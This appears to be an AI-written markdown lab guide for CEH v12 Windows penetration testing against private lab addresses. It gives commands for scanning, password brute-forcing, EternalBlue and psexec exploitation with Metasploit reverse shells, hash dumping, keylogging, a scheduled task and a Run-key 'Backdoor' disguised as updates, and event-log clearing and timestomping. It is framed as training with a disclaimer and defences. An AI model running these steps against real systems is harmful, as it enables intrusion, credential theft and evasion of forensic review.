```markdown
# CEH v12 Windows Penetration Testing Lab Guide

## ⚠️ Important Legal Disclaimer

**This guide is for educational purposes only in authorized lab environments.**
- Only test systems you own or have explicit written permission to test
- Use isolated, offline lab environments
- Follow responsible disclosure practices
- CEH emphasizes **ethical** hacking principles

## 🏠 Lab Environment Setup

### Required Components

**Virtualization Software:**
- VMware Workstation/Player
- VirtualBox
- Hyper-V

**Network Configuration:**
- Host-only or NAT network
- Isolated from production networks
- IP range: 192.168.100.0/24 (recommended)

### Lab Machines

| Machine | OS | Purpose | IP Address |
|---------|----|---------|------------|
| Kali Linux | Kali Linux 2024.1 | Attacker | 192.168.100.10 |
| Windows Target | Windows 10/7/Server | Victim | 192.168.100.20 |
| Metasploitable | Metasploitable 3 | Additional Practice | 192.168.100.30 |

## 📋 Methodology Overview

### 1. Reconnaissance
### 2. Scanning & Enumeration
### 3. Gaining Access
### 4. Maintaining Access
### 5. Covering Tracks

## 🔍 Phase 1: Reconnaissance

### Network Discovery

```bash
# Ping sweep
nmap -sn 192.168.100.0/24

# Identify live hosts
netdiscover -r 192.168.100.0/24

# ARP scan
arp-scan -l
```

### Target Identification

```bash
# Basic port scan
nmap -sS 192.168.100.20

# Service version detection
nmap -sV -sC 192.168.100.20

# OS fingerprinting
nmap -O 192.168.100.20
```

## 🔎 Phase 2: Scanning & Enumeration

### Comprehensive Port Scanning

```bash
# Full TCP port scan
nmap -p- --min-rate 1000 192.168.100.20

# Service enumeration on found ports
nmap -sV -sC -p 80,135,139,445,3389 192.168.100.20

# Vulnerability scripts
nmap --script vuln 192.168.100.20
```

### SMB/NetBIOS Enumeration

```bash
# SMB share enumeration
smbclient -L //192.168.100.20 -N

# SMB version detection
nmap --script smb-os-discovery -p 445 192.168.100.20

# SMB vulnerability scanning
nmap --script smb-vuln* -p 445 192.168.100.20

# Enum4linux for comprehensive enumeration
enum4linux -a 192.168.100.20
```

### RDP Enumeration

```bash
# RDP security check
nmap -p 3389 --script rdp-enum-encryption 192.168.100.20

# Check for BlueKeep vulnerability
nmap -p 3389 --script rdp-vuln-ms12-020 192.168.100.20
```

### Web Service Enumeration

```bash
# Directory brute-forcing
gobuster dir -u http://192.168.100.20 -w /usr/share/wordlists/dirb/common.txt

# Nikto web scanner
nikto -h http://192.168.100.20

# WhatWeb for technology detection
whatweb http://192.168.100.20
```

## ⚔️ Phase 3: Gaining Access

### Password Attacks

```bash
# SMB brute force
hydra -L users.txt -P passwords.txt smb://192.168.100.20

# RDP brute force
hydra -t 1 -V -f -L users.txt -P passwords.txt rdp://192.168.100.20

# HTTP form brute force
hydra -l admin -P passwords.txt 192.168.100.20 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
```

### Metasploit Framework Usage

#### EternalBlue (MS17-010) Exploitation

```bash
# Start Metasploit
msfconsole

# EternalBlue exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.100.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.10
set LPORT 4444
exploit
```

#### SMB Login Exploitation

```bash
# SMB login with known credentials
use exploit/windows/smb/psexec
set RHOSTS 192.168.100.20
set SMBUser administrator
set SMBPass Password123
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.100.10
exploit
```

### Web Application Attacks

#### SQL Injection Testing

```bash
# SQLmap for automated testing
sqlmap -u "http://192.168.100.20/login.php" --forms --batch

# Manual testing with Burp Suite
# Intercept requests and modify parameters
```

#### File Upload Vulnerabilities

```bash
# Test file upload functionality
# Upload web shells like:
# - Simple ASPX shell
# - PHP reverse shell
# - JSP backdoor
```

## 🏴‍☠️ Phase 4: Post-Exploitation

### Meterpreter Basics

```bash
# Basic system info
sysinfo
getuid

# Privilege escalation
getsystem

# Password dumping
hashdump

# Keylogging
keyscan_start
keyscan_dump
```

### Privilege Escalation Techniques

#### Windows Kernel Exploits

```bash
# Use local exploit suggester
run post/multi/recon/local_exploit_suggester

# Common privilege escalation modules
use exploit/windows/local/bypassuac
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

#### Service-based Escalation

```bash
# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -ucqv <ServiceName>

# Unquoted service path vulnerability
sc qc <ServiceName>
```

### Lateral Movement

#### Pass-the-Hash Attacks

```bash
# Use captured hashes
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass <NTLMHash>
set RHOSTS 192.168.100.30
exploit
```

#### WMI Execution

```bash
# WMI command execution
wmic /node:192.168.100.30 process call create "cmd.exe /c whoami"
```

## 📊 Phase 5: Maintaining Access

### Persistence Mechanisms

#### Meterpreter Persistence

```bash
# Create persistent backdoor
run persistence -U -i 60 -p 443 -r 192.168.100.10

# Service installation
run metsvc -A
```

#### Scheduled Tasks

```bash
# Create scheduled task for persistence
schtasks /create /tn "WindowsUpdate" /tr "C:\shell.exe" /sc minute /mo 1

# Registry persistence
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\shell.exe"
```

## 🧹 Phase 6: Covering Tracks

### Log Manipulation

```bash
# Clear event logs
wevtutil el | foreach {wevtutil cl "$_"}

# Meterpreter log clearing
clearev
```

### File System Cleanup

```bash
# Remove tools and scripts
del /f /q C:\tools\*
rm -f /tmp/meterpreter.*

# Timestamp manipulation
timestomp file.txt -z "01/01/2020 12:00:00"
```

## 🛡️ Defensive Countermeasures

### Detection Techniques

**Monitor for:**
- Unusual SMB traffic patterns
- Multiple failed login attempts
- New scheduled tasks/services
- Unauthorized registry modifications
- Suspicious process creation

### Prevention Strategies

**Implement:**
- Regular patch management
- Strong password policies
- Network segmentation
- Application whitelisting
- Proper logging and monitoring

## 🧪 Practice Exercises

### Exercise 1: Basic Enumeration
**Objective:** Enumerate SMB shares and users on target

### Exercise 2: Password Attack
**Objective:** Crack weak SMB passwords

### Exercise 3: Vulnerability Exploitation
**Objective:** Exploit MS17-010 vulnerability

### Exercise 4: Privilege Escalation
**Objective:** Escalate from user to SYSTEM privileges

### Exercise 5: Persistence
**Objective:** Establish persistent access to compromised system

## 📝 Lab Report Template

```markdown
# Penetration Test Report

## Executive Summary
- Test Date: [Date]
- Target: [IP Address]
- Tester: [Your Name]

## Methodology
1. Reconnaissance
2. Enumeration
3. Exploitation
4. Post-Exploitation
5. Reporting

## Findings
### Critical Vulnerabilities
- [List critical issues]

### Recommendations
- [List remediation steps]

## Detailed Technical Findings
[Technical details of each finding]
```

## 🔧 Useful Tools Checklist

- [ ] Nmap
- [ ] Metasploit Framework
- [ ] Burp Suite
- [ ] John the Ripper
- [ ] Hashcat
- [ ] Wireshark
- [ ] Mimikatz
- [ ] PowerSploit
- [ ] BloodHound
- [ ] Responder

## 📚 Additional Resources

### Practice Platforms
- Hack The Box
- TryHackMe
- VulnHub machines
- OverTheWire

### Documentation
- Metasploit Unleashed
- Nmap documentation
- OWASP Testing Guide
- MITRE ATT&CK Framework

---

**Remember:** Ethical hacking is about improving security, not breaking it. Always practice responsibly!
```

This markdown file provides a comprehensive guide for your CEH v12 Windows penetration testing lab practice. Save it as `ceh_windows_pentest.md` and use it as your lab reference.